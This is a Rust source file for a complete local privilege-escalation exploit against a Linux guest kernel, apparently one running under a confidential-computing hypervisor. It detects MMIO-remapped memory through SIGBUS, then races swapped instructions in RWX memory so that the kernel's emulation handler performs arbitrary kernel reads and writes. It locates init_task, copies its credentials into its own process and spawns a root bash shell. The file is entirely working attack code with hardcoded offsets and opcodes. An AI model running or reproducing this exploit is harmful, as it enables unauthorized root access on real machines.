use anyhow::{bail, Context, Result};
use bytemuck::{bytes_of, bytes_of_mut, AnyBitPattern, NoUninit};
use libc::{c_void, siginfo_t, ucontext_t, REG_RIP};
use nix::{
    sys::{
        mman::{mmap, MapFlags, ProtFlags},
        signal::{sigaction, SaFlags, SigAction},
        signalfd::SigSet,
    },
    unistd::{execv, getpid},
};

use std::{
    arch::asm,
    ffi::CStr,
    marker::PhantomData,
    num::NonZeroUsize,
    sync::atomic::{AtomicBool, Ordering},
};

pub const PID_OFFSET: usize = 0x998;
pub const CHILDREN_OFFSET: usize = 0x9b8;
pub const SIBLING_OFFSET: usize = CHILDREN_OFFSET + 0x10;
const REAL_CRED_OFFSET: usize = 0xb58;
pub const COMM_OFFSET: usize = 0xb70;

fn main() -> Result<()> {
    let ptr = find_mmio_pointer()?;
    attack(ptr)
}

/// Find some memory that's marked as MMIO memory in the hypervisor's nested
/// page tables.
///
/// Usually it's not possible for non-root users to map MMIO memory, so we rely
/// on the hypervisor to change some normal memory to MMIO memory. The problem
/// with that is that we don't know any physical addresses of the memory we
/// allocated.
/// To get around this, we allocate a large chunk of normal memory and
/// continuously write to it. When the hypervisor changes the memory type to
/// MMIO memory this will cause a SIGBUS exception.
fn find_mmio_pointer() -> Result<&'static u8> {
    // Allocate 8GiB of memory.
    let len = 8 * 512 * 512 * 4096;
    let base = unsafe {
        mmap(
            None,
            NonZeroUsize::new(len).unwrap(),
            ProtFlags::PROT_READ | ProtFlags::PROT_WRITE,
            MapFlags::MAP_PRIVATE | MapFlags::MAP_ANONYMOUS,
            0,
            0,
        )
        .context("failed to allocate memory")?
    };

    // Install a SIGBUS handler.
    static CAUGHT_SIGBUS: AtomicBool = AtomicBool::new(false);
    extern "C" fn sigbus_handler(_: i32, _: *mut siginfo_t, ucontext: *mut c_void) {
        let ucontext = unsafe { &mut *ucontext.cast::<ucontext_t>() };
        ucontext.uc_mcontext.gregs[REG_RIP as usize] += 3;
        CAUGHT_SIGBUS.store(true, Ordering::SeqCst);
    }
    unsafe {
        sigaction(
            nix::sys::signal::Signal::SIGBUS,
            &SigAction::new(
                nix::sys::signal::SigHandler::SigAction(sigbus_handler),
                SaFlags::SA_ONSTACK | SaFlags::SA_RESETHAND,
                SigSet::empty(),
            ),
        )
        .context("failed to install signal handler")?;
    }

    println!("writing to memory to populate pages");
    for offset in (0..len).step_by(0x1000) {
        let ptr = base.wrapping_add(offset).cast::<u8>();
        unsafe {
            ptr.write_volatile(1);
        }
    }

    // Write to all pages until we catch a SIGBUS signal.
    println!("waiting for hypervisor to change memory to MMIO");
    loop {
        for offset in (0..len).step_by(0x1000) {
            let ptr = base.wrapping_add(offset).cast::<u8>();
            unsafe {
                // Use inline assembly, so that we know the precises size of
                // the instruction to skip in the sigbus handler.
                asm!("mov [rax], rax", in("rax") ptr);
            }

            // If a SIGBUS signal occured, we know we tried to write to MMIO memory.
            if CAUGHT_SIGBUS.load(Ordering::SeqCst) {
                return Ok(unsafe { &*ptr });
            }
        }
    }
}

fn attack(mmio_ptr: &'static u8) -> Result<()> {
    extern "C" fn sigbus_handler(_: i32, _: *mut siginfo_t, _: *mut c_void) {}

    extern "C" fn sigsegv_handler(_: i32, _: *mut siginfo_t, ucontext: *mut c_void) {
        let ucontext = unsafe { &mut *ucontext.cast::<ucontext_t>() };
        ucontext.uc_mcontext.gregs[REG_RIP as usize] += 1;
    }

    unsafe {
        sigaction(
            nix::sys::signal::Signal::SIGBUS,
            &SigAction::new(
                nix::sys::signal::SigHandler::SigAction(sigbus_handler),
                SaFlags::SA_ONSTACK,
                SigSet::empty(),
            ),
        )
        .context("failed to install signal handler")?;
        sigaction(
            nix::sys::signal::Signal::SIGSEGV,
            &SigAction::new(
                nix::sys::signal::SigHandler::SigAction(sigsegv_handler),
                SaFlags::SA_ONSTACK,
                SigSet::empty(),
            ),
        )
        .context("failed to install signal handler")?;
    }

    let read_u8_instructions = SwappingInstructions::new()?;
    let write_u64_instructions = SwappingInstructions::new()?;

    let addr = find_kernel_base(read_u8_instructions, mmio_ptr);
    println!("kernel base:     {addr:#x}");

    let init_task = find_init_task(addr, read_u8_instructions, mmio_ptr)?;
    println!("init_task:       {init_task:#x}");

    let mut creds = [0; 2];
    read_slice(
        read_u8_instructions,
        init_task + REAL_CRED_OFFSET,
        mmio_ptr,
        &mut creds,
    );
    println!("init_task creds: {creds:x?}");

    println!("increasing refcounts of creds");
    for ptr in creds {
        let mut usage = 0u64;
        read_slice(read_u8_instructions, ptr, mmio_ptr, &mut usage);
        usage += 1;
        write_slice(write_u64_instructions, ptr, mmio_ptr, &usage);
    }

    let own_task = find_own_task(read_u8_instructions, mmio_ptr, init_task, None)
        .expect("couldn't find own task");
    println!("own task:        {own_task:#x}");

    println!("overwriting our creds");
    write_slice(
        write_u64_instructions,
        own_task + REAL_CRED_OFFSET,
        mmio_ptr,
        &creds,
    );

    println!("spawning shell");

    let path = CStr::from_bytes_until_nul(b"/bin/bash\0").unwrap();
    execv(path, &[path]).unwrap();

    unreachable!()
}

/// Traverse through the children and siblings of the task to find our process.
fn find_own_task(
    ins: &SwappingInstructions<ReadU8>,
    mmio_ptr: &u8,
    task_pointer: usize,
    list_head: Option<usize>,
) -> Option<usize> {
    let mut pid = 0i32;
    read_slice(ins, task_pointer + PID_OFFSET, mmio_ptr, &mut pid);

    if pid == getpid().as_raw() {
        return Some(task_pointer);
    }

    let new_head = task_pointer + CHILDREN_OFFSET;
    let mut next_child = 0usize;
    read_slice(ins, new_head, mmio_ptr, &mut next_child);
    if next_child != 0 {
        let next_child = next_child - SIBLING_OFFSET;
        if next_child + SIBLING_OFFSET != new_head {
            if let Some(addr) = find_own_task(ins, mmio_ptr, next_child, Some(new_head)) {
                return Some(addr);
            }
        }
    }

    let mut next_sibling = 0usize;
    let addr = task_pointer + SIBLING_OFFSET;

    let Some(head) = list_head else {
        return None;
    };
    if addr == head {
        return None;
    }

    read_slice(ins, addr, mmio_ptr, &mut next_sibling);
    let next_sibling = next_sibling - SIBLING_OFFSET;
    if next_sibling + SIBLING_OFFSET == head {
        return None;
    }

    find_own_task(ins, mmio_ptr, next_sibling, Some(head))
}

/// Find the `init_task` global.
fn find_init_task(
    kernel_base: usize,
    ins: &SwappingInstructions<ReadU8>,
    mmio_ptr: &u8,
) -> Result<usize> {
    for page_offset in (0..).map(|i| i * 0x1000) {
        let page = kernel_base + page_offset;

        'inner: for offset in (0..0x1000).step_by(0x40).map(|i| i + 0x30) {
            for (idx, needle) in b"swapper".iter().copied().enumerate() {
                let addr = page + offset + idx;

                loop {
                    if let Some(a) = read(ins, addr, mmio_ptr) {
                        if needle != a {
                            continue 'inner;
                        }

                        break;
                    }
                }
            }

            return Ok(page + offset - COMM_OFFSET);
        }
    }

    bail!("task not found")
}

/// Locate the kernel base.
fn find_kernel_base(ins: &SwappingInstructions<ReadU8>, mmio_ptr: &u8) -> usize {
    const KERNEL_ASLR_RANGE_START: usize = 0xffffffff80000000;
    const KERNEL_ASLR_RANGE_END: usize = 0xffffffffc0000000;
    const KERNEL_ALIGNMENT: usize = 0x20_0000;
    (KERNEL_ASLR_RANGE_START..=KERNEL_ASLR_RANGE_END)
        .step_by(KERNEL_ALIGNMENT)
        .find(|addr| read(ins, *addr, mmio_ptr).is_some())
        .expect("couldn't find kernel base")
}

/// Write a single u64 of kernel memory.
fn write(ins: &SwappingInstructions<WriteU64>, write_ptr: usize, value: usize, mmio_ptr: &u8) {
    // Try to write 200 in the hopes that at least one attempt will go through.
    for _ in 0..200 {
        ins.attack(write_ptr, value, mmio_ptr as *const u8 as usize);
    }
}

/// Write to a slice of kernel memory.
fn write_slice(
    ins: &SwappingInstructions<WriteU64>,
    write_ptr: usize,
    mmio_ptr: &u8,
    buffer: &impl NoUninit,
) {
    assert_eq!(write_ptr % 8, 0);
    for (i, buffer) in bytes_of(buffer).chunks(8).enumerate() {
        write(ins, write_ptr + i * 8, buffer.as_ptr() as usize, mmio_ptr);
    }
}

/// Read a single byte of kernel memory.
///
/// Returns `None` if the memory couldn't be read. This can happen because the
/// memory isn't mapped or because of bad luck with the race condition.
fn read(ins: &SwappingInstructions<ReadU8>, read_ptr: usize, mmio_ptr: &u8) -> Option<u8> {
    // Limit to 20 attempts.
    for i in 0..20 {
        // Try to read.
        let mut buffer = i as u8;
        ins.attack(
            &mut buffer as *mut _ as usize,
            read_ptr,
            mmio_ptr as *const u8 as usize,
        );

        // If the byte has changed, we probably read from the pointer.
        if buffer != i as u8 {
            return Some(buffer);
        }
    }

    None
}

/// Read a slice of kernel memory.
fn read_slice(
    ins: &SwappingInstructions<ReadU8>,
    read_ptr: usize,
    mmio_ptr: &u8,
    buffer: &mut (impl NoUninit + AnyBitPattern),
) {
    for (i, buffer) in bytes_of_mut(buffer).iter_mut().enumerate() {
        loop {
            if let Some(b) = read(ins, read_ptr + i, mmio_ptr) {
                *buffer = b;
                break;
            }
        }
    }
}

trait Instructions<const SIZE: usize>: Send + Sync + 'static {
    const ACCESS_MMIO: [u8; SIZE];
    const ACCESS_MEMORY: [u8; SIZE];
}

struct ReadU8;

impl Instructions<8> for ReadU8 {
    // 0:  48 87 d4                xchg   rsp,rdx
    // 3:  58                      pop    rax
    // 4:  48 87 d4                xchg   rsp,rdx
    // 7:  c3                      ret
    const ACCESS_MMIO: [u8; 8] = [0x48, 0x87, 0xD4, 0x58, 0x48, 0x87, 0xD4, 0xC3];

    // 0:  48 87 d4                xchg   rsp,rdx
    // 3:  a4                      movs   BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
    // 4:  48 87 d4                xchg   rsp,rdx
    // 7:  c3                      ret
    const ACCESS_MEMORY: [u8; 8] = [0x48, 0x87, 0xD4, 0xA4, 0x48, 0x87, 0xD4, 0xC3];
}

struct WriteU64;

impl Instructions<9> for WriteU64 {
    // 0:  48 87 d4                xchg   rsp,rdx
    // 3:  41 58                   pop    r8
    // 5:  48 87 d4                xchg   rsp,rdx
    // 8:  c3                      ret
    const ACCESS_MMIO: [u8; 9] = [0x48, 0x87, 0xD4, 0x41, 0x58, 0x48, 0x87, 0xD4, 0xC3];

    // 0:  48 87 d4                xchg   rsp,rdx
    // 3:  48 a5                   movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
    // 5:  48 87 d4                xchg   rsp,rdx
    // 8:  c3                      ret
    const ACCESS_MEMORY: [u8; 9] = [0x48, 0x87, 0xD4, 0x48, 0xA5, 0x48, 0x87, 0xD4, 0xC3];
}

struct SwappingInstructions<I> {
    ptr: extern "C" fn(arbitrary_write: usize, arbitrary_read: usize, mmio: usize),
    _marker: PhantomData<I>,
}

impl<I> SwappingInstructions<I> {
    pub fn new<const N: usize>() -> Result<&'static Self>
    where
        I: Instructions<N>,
    {
        // Allocate some RWX memory.
        let ptr = unsafe {
            mmap(
                None,
                NonZeroUsize::new(4096).unwrap(),
                ProtFlags::PROT_READ | ProtFlags::PROT_WRITE | ProtFlags::PROT_EXEC,
                MapFlags::MAP_PRIVATE | MapFlags::MAP_ANON,
                0,
                0,
            )
            .context("failed to allocate memory for instructions")?
        };

        // Write some opcodes to it.
        unsafe {
            ptr.cast::<[u8; N]>().write_volatile(I::ACCESS_MMIO);
        }

        // Transmute the pointer to a function.
        let this = Self {
            ptr: unsafe { core::mem::transmute(ptr) },
            _marker: PhantomData,
        };

        // Leak this struct to the heap.
        let this = Box::leak(Box::new(this)) as &'static Self;

        // Start a new thread that continuously swaps the instructions.
        std::thread::spawn(move || loop {
            let ptr = this.ptr as usize as *mut [u8; N];
            unsafe {
                ptr.write_volatile(I::ACCESS_MMIO);
                ptr.write_volatile(I::ACCESS_MEMORY);
            }
        });

        Ok(this)
    }

    /// Execute the instructions. One of these things will happen:
    /// 1. `MOVS` will cause a #PF.
    /// 2. `POP` will cause a #VC(NPF) and the kernel reads `POP` and causes a
    ///    SIGBUS signal because the memory pointed to an MMIO address.
    /// 3. `POP` will cause a #VC(NPF) and the kernel reads `MOVS` and
    ///    successfully simulates it.
    pub fn attack(&self, write_ptr: usize, read_ptr: usize, mmio_ptr: usize) {
        (self.ptr)(write_ptr, read_ptr, mmio_ptr)
    }
}
